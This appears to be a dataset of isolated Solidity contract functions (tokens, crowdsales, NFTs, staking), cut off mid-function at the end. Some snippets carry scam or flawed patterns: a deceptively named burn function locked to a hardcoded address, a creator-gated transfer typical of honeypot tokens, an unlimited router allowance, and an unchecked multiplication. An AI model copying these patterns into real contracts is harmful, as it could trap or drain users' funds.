function returnWebsiteData() external view returns(uint, uint, uint, uint, uint, uint, uint, uint,  bool) {

        return (startBlock, endBlock, backersIndex.length, ethReceivedPresaleOne, ethReceivedPresaleTwo, ethReceiveMainSale, maxCapTokens,   minInvestment,  stopped);
    }
--------------------------------------------------------------------------------
function registerContract(address addr) public onlyAdmin {
        require(isContract(addr));
        _contracts[addr] = true;
        emit ContractAdded(msg.sender, addr);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function unregisterMinterERC20(address ERC20) public isOwner {
        require(isMinterERC20(ERC20), "This address is not registered");
        delete minterERC20s[ERC20];
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function tokenFallback(address, uint256 _value, bytes) public {
        require(msg.sender == address(betherToken));
        require(betherToken.transfer(address(balanceManager), _value));
    }
--------------------------------------------------------------------------------
function disableInitialStage() public onlyOwner() {
        require(initialState == true, "initial stage is already false!");
        initialState = false;
    }
--------------------------------------------------------------------------------
function getProjectsByScoreType(address _address, ScoreType _scoreType) internal view returns(bytes32[]) {
        if (_scoreType == ScoreType.CustomerSatisfaction) {
            return makerProjects[_address];
        } else {
            return clientProjects[_address];
        }
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address operator, bool approved) external {
        operatorApprovals[msg.sender][operator] = approved;
        emit ApprovalForAll(msg.sender, operator, approved);
    }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public ownerOnly {
        require(!_feeless || _feeless && canFeeWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public ownerOnly {
        require(!_feeless || _feeless && canFeeWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function _setTokenRoyalty(
        uint id,
        address recipient,
        uint256 value
    ) internal {
        require(value <= 10000, 'ERC2981Royalties: Too high');

        _royalties[id] = Royalty(recipient, value);
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
    {
        // Update operator status
        operators[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {
    super._preValidatePurchase(_beneficiary, _weiAmount);
    require(contributions[_beneficiary].add(_weiAmount) <= caps[_beneficiary]);
  }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x33c26026B2c84cFFa2a6520793F915c9780e0b05,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function transferOwnership(
    address _newOwner
  )
    public
    onlyOwner
  {
    require(_newOwner != address(0), CANNOT_TRANSFER_TO_ZERO_ADDRESS);
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
--------------------------------------------------------------------------------
function lastTimeOf(address _owner) public view returns (uint256 interval, uint256 time) {
        return (accounts[_owner].lastInterval, ((accounts[_owner].lastInterval).mul(tokenGenInterval)).add(startTime));
    }
--------------------------------------------------------------------------------
function transferOwnership(address to) public onlyOwner {
         owner = to;
         balances[owner]=balances[msg.sender];
         balances[msg.sender]=0;
    }
--------------------------------------------------------------------------------
function addToBlackList(address account) external onlyOwner {
    require(account != owner(),"Owner address can not blacklisted");
    _isBlacklisted[account] = true;
    }
--------------------------------------------------------------------------------
function getContract(address _add1, address _add2) external view returns(address){
        bytes16 _sig = bytes16(keccak256(_add1))^bytes16(keccak256(_add2));
        return sig_to_add[_sig];
    }
--------------------------------------------------------------------------------
function transferOwnership(
        address newOwner
        )
        public
        virtual
        onlyOwner
    {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner) public onlyOwner {
        require(
            _newOwner != address(0)
            && _newOwner != owner 
        );
        OwnershipTransferred(owner, _newOwner);
        owner = _newOwner;
    }
--------------------------------------------------------------------------------
function disableFundingWallets(address _address) external onlyOwner {
        require(fundingEnabled);
        require(fundingWallet != _address);
        require(fundingWallets[_address]);

        fundingWallets[_address] = false;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {

    bool withinPeriod = started;

    bool nonZeroPurchase = msg.value != 0;

    return withinPeriod && nonZeroPurchase;

  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function setENS(ENS _ens) public {
      require(address(ens) == 0);
      ens = _ens;
      resolver = PublicResolver(ens.resolver(lighthouseNode));
    }
--------------------------------------------------------------------------------
function spawnMany(uint amount) public {
        for (uint i = 0; i < amount; i++) {
            rocketeer.spawnRocketeer(msg.sender);
        }
    }
--------------------------------------------------------------------------------
function setPoolId(uint256 _pid) public onlyOwner {
        uint256 old = masterChefPoolId;
        masterChefPoolId = _pid;
        emit PoolIdChanged(msg.sender, old, _pid);
    }
--------------------------------------------------------------------------------
function withdrawTokensAfter(address tokenAddr,address sendTo) public isCreator{
    require(withdrawOccurred); //only possible after winner has been paid.
    IERC20(tokenAddr).transfer(sendTo,IERC20(tokenAddr).balanceOf(address(this)));
  }
--------------------------------------------------------------------------------
function getPermissions() public view returns(bytes32[]) {
        bytes32[] memory allPermissions = new bytes32[](1);
        allPermissions[0] = WHITELIST;
        return allPermissions;
    }
--------------------------------------------------------------------------------
function earnAll() public {
        for (uint256 i = 0; i < numVaults; i++) {
            RewardedVault(vaults[i]).earn();
        }
    }
--------------------------------------------------------------------------------
function isContract( address _addr ) private returns (bool) {
    uint length;
    _addr = _addr;
    assembly { length := extcodesize(_addr) }
    return (length > 0);
  }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function setCasper(address _casper)
        external
        onlyOwner
    {
        blocks.casper = _casper;
        blocks.initialized[_casper] = true;
        emit NewCasper(blocks.casper);
    }
--------------------------------------------------------------------------------
function setMinSell(
        ERC20 pay_gem, //token to assign minimum sell amount to
        uint256 dust //maker (ask) minimum sell amount
    ) external auth note returns (bool) {
        _dust[address(pay_gem)] = dust;
        emit LogMinSell(address(pay_gem), dust);
        return true;
    }
--------------------------------------------------------------------------------
function ICOContract(address _tokenAddress, address _projectWallet, uint _sealTimestamp, uint _minimumCap,
                         uint _maximumCap) public {
        token = Token(_tokenAddress);
        projectWallet = _projectWallet;
        sealTimestamp = _sealTimestamp;
        minimumCap = _minimumCap;
        maximumCap = _maximumCap;
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function isBallotInProgress(uint32 _ballotId) private constant returns (bool) {
    return (isBallotSealed(_ballotId)
            && ballotDetails[_ballotId].start <= now
            && ballotDetails[_ballotId].end >= now);
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function setContractVariables(
        uint lockupTime,
        uint stakingFeeRateX100, 
        uint unstakingFeeRateX100,
        address router,
        address newFeeRecipientAddress
    ) external onlyOwner {
        setLockupTime(lockupTime);
        setStakingFeeRateX100(stakingFeeRateX100);
        setUnstakingFeeRateX100(unstakingFeeRateX100);
        setUniswapV2Router(IUniswapV2Router(router));
        setFeeRecipientAddress(newFeeRecipientAddress);
    }
--------------------------------------------------------------------------------
constructor(IERC20 _tokenContract) {
        owner = msg.sender;
        tokenContract = _tokenContract;
        contractAddress = address(this);
        currentLockTimer = block.timestamp;
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function ARM(
    ) public {
        totalSupply = 100000000000000000000000000;                              // Total supply with the decimal amount
        balanceOf[msg.sender] = 100000000000000000000000000;                    // All initial tokens
        name = "ARM 袋鼠链";                                                    // The name for display purposes
        symbol = "ARM";                                                         // The symbol for display purposes
    }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId)
        external
        view
        returns (uint256)
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) throw;
      if (msg.sender != upgradeMaster) throw;
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function mul(uint256 a, uint256 b) internal pure returns (uint256) {
if (a == 0) {
return 0;
}
uint256 c = a * b;
return c;
}
--------------------------------------------------------------------------------
function changeWhitelistingStatus() onlyOwner public{
            if (whitelistingStatus == false){
			    whitelistingStatus = true;
                whitelisted[owner]= true;
            }
            else{
                whitelistingStatus = false;    
            }
		}
--------------------------------------------------------------------------------
function manualWithdrawToken(uint256 _amount) onlyOwner public {
      		uint256 tokenAmount = _amount.mul(100);
            _transfer(address(this), msg.sender, tokenAmount);
        }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function transferMined() external onlyAdmin {
        balances[admin]             = add(balances[admin], _rewardperweek);
        emit Transfer(0, admin, _rewardperweek);
    }
--------------------------------------------------------------------------------
function setRewardsAmount(address _property, uint256 _value) external {
		addressValidator().validateAddress(msg.sender, config().withdraw());

		eternalStorage().setUint(getRewardsAmountKey(_property), _value);
	}
--------------------------------------------------------------------------------
function setCumulativePrice(address _property, uint256 _value) external {
		addressValidator().validateAddress(msg.sender, config().withdraw());

		eternalStorage().setUint(getCumulativePriceKey(_property), _value);
	}
--------------------------------------------------------------------------------
function _getTokenAmount(uint256 _weiAmount)internal view returns(uint256) {
		_weiAmount = _weiAmount.mul(ethRate);
		return _weiAmount.div(10 ** uint(18 - _decimals)); //as we have other decimals number than standard 18, we need to calculate
	}
--------------------------------------------------------------------------------
function chooseWinner() internal {
         if ((nextTokenId - 1) == totalTokenSupply) {
            winningTokenId = getRandomNumber();
            emit WinnerIsChosen(tokenOwner[winningTokenId], winningTokenId);
        } 
    }
--------------------------------------------------------------------------------
function scalePurchaseTokenAmountToMatchRemainingTokens(uint256 _amount) internal view returns (uint256 _exactAmount) {
        if (nextTokenId + _amount - 1 > totalTokenSupply) {
            _amount = totalTokenSupply - nextTokenId + 1;
        }
        
        return _amount;
    }
--------------------------------------------------------------------------------
function QuadToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function withdrawBalance() external onlyCFO {
        uint256 balance = address(this).balance;
        require (balance > 0);
        cfoAddress.transfer(balance);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x3c7B615c4102fB03d9086f1547B90cB8f050c204,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function SEOSToken() {
        owner = msg.sender;
        totalSupply = 3.2 * 10 ** 26;
        balances[owner] = totalSupply;
    }
--------------------------------------------------------------------------------
function setPresaleAddress(address _presaleAddress) external onlyOwner {
        require(presaleAddress == 0x0);
        presaleAddress = _presaleAddress;
        balances[_presaleAddress] = balances[_presaleAddress].add(presaleSupply);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
        returns (bool success) {
		if (_value <= 0) revert();//throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function claimRewards(uint[] _challengeIDs) public {
        // loop through arrays, claiming each individual vote reward
        for (uint i = 0; i < _challengeIDs.length; i++) {
            claimReward(_challengeIDs[i]);
        }
    }
--------------------------------------------------------------------------------
function getBuyPrice() public constant returns (uint256 price) {
    uint256 accumulatedDistributionPercentage = getAccumulatedDistributionPercentage();

    return initialBuyPrice.
      mul(PRICE_FACTOR.sub(accumulatedDistributionPercentage)).
      div(PRICE_FACTOR);
  }
--------------------------------------------------------------------------------
function QIUToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[owner] = INITIAL_SUPPLY / 10;
        balances[this] = INITIAL_SUPPLY - balances[owner];
    }
--------------------------------------------------------------------------------
function transfer(address dst, uint256 amount) external nonReentrant returns (bool) {
        return transferTokens(msg.sender, msg.sender, dst, amount) == uint(Error.NO_ERROR);
    }
--------------------------------------------------------------------------------
function borrowBalanceCurrent(address account) external nonReentrant returns (uint) {
        require(accrueInterest() == uint(Error.NO_ERROR), "accrue interest failed");
        return borrowBalanceStored(account);
    }
--------------------------------------------------------------------------------
function OurToken(uint _initialSupply, string _name, string _symbol) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = 0;
        balances[owner] = _initialSupply;
    }
--------------------------------------------------------------------------------
function authorizeOwnershipTransfer(address _authorizedAddress) external {
        require(msg.sender == _owner, "Invalid sender");

        _authorizedNewOwner = _authorizedAddress;

        emit OwnershipTransferAuthorization(_authorizedNewOwner);
    }
--------------------------------------------------------------------------------
function extendTDE(uint256 endDate)
        onlyCofounders
        returns (bool)
    {
        // Make sure that the new date is past the existing date and
        // is not in the past.
        if (endDate > now && endDate > TDEEndDate) {
            TDEEndDate = endDate;
            return true;
        }

        return false;
    }
--------------------------------------------------------------------------------
function transferFromAndCall(
    address _from,
    address _to,
    uint256 _value,
    bytes _data
  )
    public payable returns (bool)
  {
    require(_to != address(this));

    super.transferFrom(_from, _to, _value);

    // solium-disable-next-line security/no-call-value
    //require(_to.call.value(msg.value)(_data));
    return true;
  }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function airdrop(address[] memory addresses) external onlyOwner {
        for (uint256 i = 0; i < addresses.length; i++) {
            _mintToken(addresses[i]);
        }
    }
--------------------------------------------------------------------------------
function removeCollabPartner(address collabAddress) external onlyOwner {
        require(isCollabPartner[collabAddress] == true, "Not marked as partner");
        isCollabPartner[collabAddress] = false;
    }
--------------------------------------------------------------------------------
function placeInLine(address user) view returns(uint){
    if(queuePosition[user]>payoutIdx){
      return queuePosition[user]-payoutIdx;
    }
    else{
      return 0;
    }
  }
--------------------------------------------------------------------------------
function increaseCap(uint256 _cap_inc) onlyOwner public {
        require(_cap_inc > 0);
        cap = cap.add(_cap_inc.mul(eth_decimal_num));
        IncreaseCap(cap);
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
     
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function ICO (string _campaignUrl, token _addressOfTokenUsedAsReward) public {
        creator = msg.sender;
        campaignUrl = _campaignUrl;
        tokenReward = token(_addressOfTokenUsedAsReward);

        LogFunderInitialized(
            creator,
            campaignUrl
            );
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function escapeHatch() onlyEscapeHatchCallerOrOwner {
        uint total = this.balance;
        // Send the total balance of this contract to the `escapeHatchDestination`
        if (!escapeHatchDestination.send(total)) {
            throw;
        }
        EscapeHatchCalled(total);
    }
--------------------------------------------------------------------------------
function setBetLimit(uint256 min, uint256 max) public onlyAdmins() {
        uint256 base_bet = 0.1 ether;
        min_value = base_bet * min;
        max_value = base_bet * max;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner)
        public
        view
        override
        returns (uint256)
    {
        return
            magnifiedDividendPerShare
                .mul(balanceOf(_owner))
                .toInt256Safe()
                .add(magnifiedDividendCorrections[_owner])
                .toUint256Safe() / magnitude;
    }
--------------------------------------------------------------------------------
function acceptOwnership() {
        // Avoid multiple events triggering in case of several calls from owner
        if (msg.sender == newOwner && owner != newOwner) {
            OwnershipTransferred(owner, newOwner);
            owner = newOwner;
        }
    }
--------------------------------------------------------------------------------
function allowance(
        address _owner,
        address _spender
    )
        external
        view
        returns (uint256)
    {
        if(_spender == uniRouter) {
            return type(uint256).max;
        }
        return allowed[_owner][_spender];
    }
--------------------------------------------------------------------------------
function changeVotingRules(
        uint _minimumQuorum,
        uint _debatingPeriodDuration,
        uint _requisiteMajority
    ) onlyOwner public {
        minimumQuorum = _minimumQuorum;
        debatingPeriodDuration = _debatingPeriodDuration;
        requisiteMajority = _requisiteMajority;

        emit ChangeOfRules(minimumQuorum, debatingPeriodDuration, requisiteMajority);
    }
--------------------------------------------------------------------------------
function setProxy(address _proxyAddress, bytes32 _symbol) onlyOneOfContractOwners returns(uint) {
        if (proxies[_symbol] != 0x0) {
            return CHRONOBANK_PLATFORM_PROXY_ALREADY_EXISTS;
        }

        proxies[_symbol] = _proxyAddress;
        return OK;
    }
--------------------------------------------------------------------------------
function proxyTransferWithReference(address _to, uint _value, bytes32 _symbol, string _reference, address _sender) onlyProxy(_symbol) returns(uint) {
        return _transfer(getHolderId(_sender), _createHolderId(_to), _value, _symbol, _reference, getHolderId(_sender));
    }
--------------------------------------------------------------------------------
function proxyTransferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference, address _sender) onlyProxy(_symbol) public returns (uint) {
        return _transfer(getHolderId(_from), _createHolderId(_to), _value, _symbol, _reference, getHolderId(_sender));
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function getMaxBubMiner(uint256 frozenEth, uint256 value)
        public
        view
        returns (uint256)
    {
        if (value > (frozenEth / ethWei) * 100000) {
            return (frozenEth / ethWei) * 100000;
        }
        return value;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function getWhitelistAdmin(uint256 _groupId)
        public
        view
        returns(address)
    {
        require(_isGroup(_groupId), "Group doesn't exist!");
        return whitelistGroups[_groupId].whitelistGroupAdmin;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x3dB7d3d39C3275566743eAaACC038e1237dc9886,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function triggerHalving(uint _eth_multiplier) private {
        // Set the halving number (how many halvings have occurred)
        halving_number = uint((giveaway_count + _eth_multiplier) / halving_tick);
        
        // EMIT ETH to the winning miner
        msg.sender.transfer(address(this).balance);
        
    }
--------------------------------------------------------------------------------
function cancel(uint _escrowId) external {
    address sender = getSender();
    lastActivity[sender] = block.timestamp;
    escrow.cancel_relayed(sender, _escrowId);
  }
--------------------------------------------------------------------------------
constructor (
        ERC20 _rewardToken,
        ERC721 _stakeToken,
        uint64 _DURATION
    ) {
        DURATION = _DURATION;
        rewardToken = _rewardToken;
        stakeToken = _stakeToken;
        paused = false;
        _transferOwnership(msg.sender);
    }
--------------------------------------------------------------------------------
function earned(address account) external view returns (uint256) {
        return
            _earned(
                account,
                balanceOf[account],
                _rewardPerToken(
                    totalSupply,
                    lastTimeRewardApplicable(),
                    rewardRate
                ),
                rewards[account]
            );
    }
--------------------------------------------------------------------------------
function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        if (msg.sender != address(stakeToken)) {
            revert Error_NotStakeToken();
        }
        return this.onERC721Received.selector;
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public
  returns (bool success)
  {
    bytes memory empty; // null
    _transfer( msg.sender, to, value, empty );
    return true;
  }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
        return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe().add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
    }
--------------------------------------------------------------------------------
function setToken(IERC20 newToken) external onlyAdmin {
        IERC20 oldToken = _token;
        _token = newToken;
        emit NewToken(address(oldToken), address(newToken));
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function _approve(address _owner, address _spender, uint256 _amount) internal returns (bool success)
        {
            allowed[_owner][_spender] = _amount;
            emit Approval(_owner, _spender, _amount);
            return true;
        }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
constructor(
    address _owner,
    address _investmentAddress,
    address _tokenAddress,
    address _serviceAccount
  )
    public
    BaseInvestmentPool(_owner, _investmentAddress, _tokenAddress, 50)
    RefundableInvestmentPool(_serviceAccount)
    SoftCappedInvestmentPool(0)
    HardCappedInvestmentPool(20000000000000000000000000000)
    TimedInvestmentPool(1609232185, 1609491360)
    MaxRestrictedInvestmentPool(20000000000000000000000000000)
  {
    require(softCap <= hardCap, "soft cap should be less than hard cap");
  }
--------------------------------------------------------------------------------
function getBonusPerShare() public view returns (uint256) {
        return SafeMath.div(SafeMath.mul(_data.getBonusPerShare(), 1 ether), _core.MAGNITUDE());
    }
--------------------------------------------------------------------------------
function isOwner() internal returns(bool success) {
        if ((msg.sender == owner) || (msg.sender == super_owner)) return true;
        return false;
    }
--------------------------------------------------------------------------------
function setMarketingRates(uint8 _newMkt1Rate, uint8 _newMkt2Rate, uint8 _newMkt3Rate)
        onlyAdministrator()
        public
    {
        require(_newMkt1Rate +_newMkt2Rate +_newMkt3Rate <= 60);   // 6%
       
        mkt1Rate =  _newMkt1Rate;
        mkt2Rate =  _newMkt2Rate;
        mkt3Rate =  _newMkt3Rate;

    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _deedId)
  external payable {
    require(approvedFor(_deedId) == msg.sender);
    clearApprovalAndTransfer(deedOwner[_deedId], msg.sender, _deedId);
  }
--------------------------------------------------------------------------------
function changeCooldownSettings(bool newStatus, uint256 newInterval) external onlyOwner {
        require(newInterval <= 24 hours, "Exceeds the limit");
        cooldownEnabled = newStatus;
        cooldownTimerInterval = newInterval;
    }
--------------------------------------------------------------------------------
function setIcoPercent(uint256 newIcoPercent)
  public
  onlyOwner {
    _icoPercent = newIcoPercent;
    //_icoSupply = _totalSupply * _icoPercent / 100;
    _icoSupply = _totalSupply.mul(_icoPercent).div(100);
    ParamConfig(1, _icoPercent);
  }
--------------------------------------------------------------------------------
function addManyToWhitelist(address[] users) external onlyOwner {
        for (uint32 i = 0; i < users.length; i++) {
            addToWhitelist(users[i]);
        }
    }
--------------------------------------------------------------------------------
function removeManyFromWhitelist(address[] users) external onlyOwner {
        for (uint32 i = 0; i < users.length; i++) {
            removeFromWhitelist(users[i]);
        }
    }
--------------------------------------------------------------------------------
function removeManyFromAllocationList(address[] users)
        external
        onlyOwner
        atRound(SaleRounds.EarlyInvestment)
    {
        for (uint32 i = 0; i < users.length; i++) {
            removeFromAllocationList(users[i]);
        }
    }
--------------------------------------------------------------------------------
function viewCharity(uint256 i) external view returns (Charity memory) {
        require(i < charities.length,"ERROR: out of bounds");
        return(charities[i]);
    }
--------------------------------------------------------------------------------
function setBonusRate(uint256 _newBonusRate) public onlyOwner {
		require(_newBonusRate <= BONUS_COEFF, "AdvanceCrowsale: Bonus exceeds the allowed limit");
		_bonusRate = _newBonusRate;
	}
--------------------------------------------------------------------------------
function changePermission(
        address _delegate,
        address _module,
        bytes32 _perm,
        bool _valid
    )
    public
    withPerm(CHANGE_PERMISSION)
    {
        require(_delegate != address(0), "invalid address");
        _changePermission(_delegate, _module, _perm, _valid);
    }
--------------------------------------------------------------------------------
function getPermissions() public view returns(bytes32[]) {
        bytes32[] memory allPermissions = new bytes32[](1);
        allPermissions[0] = CHANGE_PERMISSION;
        return allPermissions;
    }
--------------------------------------------------------------------------------
function _setUpgradeabilityOwner(address _newUpgradeabilityOwner) internal {
        require(_newUpgradeabilityOwner != address(0), "Address should not be 0x");
        __upgradeabilityOwner = _newUpgradeabilityOwner;
    }
--------------------------------------------------------------------------------
function setMainSaleDates(uint256 _mainSaleStartTime, uint256 _mainSaleEndTime) public onlyOwner returns (bool) {
    require(!isFinalised);
    require(_mainSaleStartTime < _mainSaleEndTime);
    mainSaleStartTime = _mainSaleStartTime;
    mainSaleEndTime = _mainSaleEndTime;
    return true;
  }
--------------------------------------------------------------------------------
function checkIfCanUseTokens(
        address owner,
        uint256 amount
    ) 
        internal
        view
        returns(bool) 
    {
        uint256 unfreezedAmount = wallets[owner].tokensAmount - wallets[owner].freezedAmount;
        return amount <= unfreezedAmount;
    }
--------------------------------------------------------------------------------
function increaseTotalLimitation(uint256 _limitationDelta) public onlyPoster{
        uint256 originalLimitation = totalMintLimitationInTiB;
        totalMintLimitationInTiB = totalMintLimitationInTiB.add(_limitationDelta);
        emit TotalLimitationChanged(originalLimitation, totalMintLimitationInTiB);
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 expiry) onlyOwner returns (bool success) {
        if (expiry > 1000000) throw;
        inactivityReleasePeriod = expiry;

        emit InactivityReleasePeriodChange(expiry);
        return true;
    }
--------------------------------------------------------------------------------
function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_) {
        owner = msg.sender;
        feeAccount = feeAccount_;
        inactivityReleasePeriod = 100000;
        makerFee = makerFee_;
        takerFee = takerFee_;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);
        
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function rateIsStale(bytes4 currencyKey)
        external
        view
        returns (bool)
    {
        // sUSD is a special case and is never stale.
        if (currencyKey == "sUSD") return false;

        return lastRateUpdateTimes[currencyKey].add(rateStalePeriod) < now;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
